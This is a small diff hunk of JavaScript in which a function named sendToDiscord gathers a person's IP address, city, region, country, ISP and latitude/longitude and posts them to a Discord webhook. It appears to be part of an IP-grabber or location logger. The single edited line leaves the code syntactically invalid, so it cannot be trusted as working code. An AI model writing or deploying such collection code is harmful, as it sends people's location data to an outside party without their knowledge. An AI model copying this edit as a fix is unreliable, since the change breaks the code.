@@ -15,7 +15,7 @@ async function sendToDiscord(ipInfo) {
     
     const data = {
         content: `Data Information:\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nOrg: ${ipInfo.org}\nLocation: Latitude: ${latitude}, Longitude: ${longitude}`
-    
+    },
     try {
         const response = await fetch(webhookURL, {
             method: 'POST',
